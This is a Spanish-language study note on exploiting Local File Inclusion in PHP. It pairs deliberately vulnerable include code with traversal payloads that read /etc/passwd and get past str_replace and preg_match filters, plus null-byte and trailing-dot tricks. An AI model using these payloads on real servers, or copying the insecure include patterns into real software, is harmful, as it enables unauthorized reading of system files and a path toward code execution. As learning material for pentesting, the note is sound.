---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #LFI
--------------
# Definición

> **LFI (local file inclusion)** es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante manipular la entrada de archivos en una aplicación para cargar y ejecutar archivos arbitrarios en el servidor. Esto puede llevar a la exposición de información confidencial, la ejecución de código malicioso y potencialmente comprometer todo el sistema.
> 
> Se produce cuando una aplicación web no valida adecuadamente las entradas de usuario, permitiendo **acceder a archivos locales**.
> 
> Se suele utilizar al abusar de parámetros de entrada en la aplicación web. Los **parámetros de entrada** son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Se pueden manipular dichos **parámetros de entrada** para incluir rutas de archivo local en la solicitud, permitiendo acceder a archivos en el servidor web. Esta técnica se conoce como **Directory Path Traversal** y se utiliza comúnmente en ataques de LFI.
> 
> Empleando **Directory Path Traversal** el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema. Por ejemplo, se podría incluir "../" en el parámetro de entrada para navegar en el directorio superior en el que se encuentre actualmente.


--------
# Explotación

A la hora de representar el contenido en la página web, debemos fijarnos en la **URL**, ya que puede ser que la subpágina en la que estemos esté siendo pasada como un parámetro en la misma **URL**. Acaban de la siguiente manera: 

```
<URL>?filename=ejemplo
```

Por lo que sabemos que existe el parámetro *filename* del que podemos intentar abusar.

Nos podemos enfrentar a distintos escenarios, en los que podemos emplear distintos vectores de ataque. Dependiendo de la seguridad de del código, podremos utilizar unos u otros. En todos ellos podemos modificar simplemente la URL, o de manera más cómoda podemos modificar las peticiones desde [[Burpsuite]]. 


En el caso en el que no tiene **ninguna precaución**, podemos simplemente probar a que se muestre un archivo que queramos, por ejemplo **/etc/passwd**. Nos enfrentamos a algo parecido a lo siguiente:

```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```

Por lo que si modificamos la url de manera que pidamos **cualquier archivo** del servidor, podremos acceder a el mismo:

```
?filename=/etc/passwd
```


Suponiendo que el desarrollador ha intentado mejorar el código, puede ser que te obligue a mostrar solo los archivos en un directorio específico, como **/var/www/html**, pero podemos burlar la seguridad utilizando "../" para acceder a archivos en directorios superiores. Nos enfrentamos a algo parecido a lo siguiente:

```php
<?php
	$filename = $_GET['filename'];
	include("/var/www/html" . $filename);   #El punto sirve para concatenar cadenas en php
?>
```

Por lo que modificando el parámetro, podemos pedirle **cualquier archivo** incluyendo una secuencia de "../" en la petición:

```
?filename=../../../../../../../../../../etc/passwd
```


Puede darse el caso, el que el desarrollador intente solucionar el problema anterior, sustituyendo cada ocurrencia de "../" por nada, de manera que desaparecerían dichas ocurrencias:

```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename)
	include("/var/www/html" . $filename);   
?>
```

Pero el problema con esta "solución" es que podemos inyectar mas ../ dentro de las cadenas, para que cuando se eliminen queden otros ../ y puedas seguir accedeindo a **cualquier archivo**:

```
?filename=....//....//....//....//....//....//....//....//....//....//etc/passwd #Cuando se eliminan los ../ quedan los exteriores
```


Otro escenario puede ser que se utilicen expresiones regulares con **preg_match** para indicar que no se quieren mostrar algunos archivos en específico, por ejemplo el /etc/passwd:

```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename)

	if(preg_match("/\/etc\/passwd/", $filename) === 1){
		echo "\n No puedes ver ese archivo\n"
	} else {
		include("/var/www/html" . $filename);   
	}
?>
```

Pero podemos seguir accediendo al mismo archivo si ponemos alguna barra más en la petición, o muchas barras y algún punto en medio:

```s
?filename=....//....//....//....//....//....//....//....//....//....//etc///.///passwd
?filename=....//....//....//....//....//....//....//....//....//....//etc/////./passwd
?filename=....//....//....//....//....//....//....//....//....//....//etc/./////passwd
?filename=....//....//....//....//....//....//....//....//....//....//etc/./././././passwd
```


Si fuera un comando ejecutado a nivel de sistema, podemos hacer uso de "?", de manera que no coincide dicha solicitud con la que está restringida:

```
?filename=....//....//....//....//....//....//....//....//....//....//e??/p?ssw?
```


En versiones anteriores a la 5.3 de **php**, si nos obligan a que un archivo tenga una configuración dada, podemos burlar dicha capa de seguridad añadiendo un **Null byte**, de manera que no es necesario que el archivo que queremos observar tenga dicha extensión. Nos podríamos enfrentar a algo parecido a lo siguiente:

```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename)
	include("/var/www/html" . $filename . ".php");   
?>
```

De manera que si incluimos el **Null byte** podemos seguir accediendo al archivo:

```
?filename=....//....//....//....//....//....//....//....//....//....//etc/passwd%00 
```


Siguiendo con versiones antiguas, puede ser que en el propio código se esté comprobando los últimos x caracteres de la petición, pero podemos burlar este método de seguridad añadiendo un "/." al final de la petición:

```
?filename=....//....//....//....//....//....//....//....//....//....//etc/passwd/.
```


Puede ocurrir que un **LFI**, pueda desencadenar en un [[RCE (Remote Command Execution)]], de manera que podemos ejecutar comandos en la máquina víctima como nos plazca, con la posibilidad de poder obtener una [[Reverse shell]]. Para ello, haremos uso de los [[Wrappers]], o del [[Log Poisoning (LFI -- RCE)]].